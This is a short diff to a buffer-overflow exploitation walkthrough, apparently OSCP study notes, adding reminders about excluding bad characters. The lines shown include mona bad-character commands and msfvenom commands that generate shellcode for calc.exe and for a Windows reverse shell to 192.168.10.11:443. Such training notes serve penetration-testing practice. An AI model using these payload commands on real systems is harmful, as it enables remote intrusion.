@@ -62,7 +62,7 @@ Running the script:
 > !mona compare -f C:\mona\oscp\bytearray.bin -a 0321FF88
 ```
 
-Generating byte array with bad characters removed. Update the script and run again util you see 'Unmodified' status in mona memory comparison results.
+Generating byte array with bad characters removed. Update the script and run again util you see 'Unmodified' status in mona memory comparison result.
 
 ```c++
 > !mona bytearray -b "\x00\x0d"
@@ -88,6 +88,8 @@ If the pointer address stop at EIP. You are good to go.
 
 ### 06 Popping Calculator
 
+*Make sure to edit bad character
+
 ```c++
 > msfvenom -p windows/exec CMD="C:\windows\system32\calc.exe" -b '\x00\x0d' -f c
 
@@ -95,6 +97,8 @@ If the pointer address stop at EIP. You are good to go.
 ```
 
 After successfully popping the calculator app, next step is to get a shell.
+
+*Again, make sure the get the bad character right. 
 
 ```c++
 > msfvenom -p windows/shell_reverse_tcp LHOST=192.168.10.11 LPORT=443 EXITFUNC=thread -f c -a x86 -b "\x00\x0d"
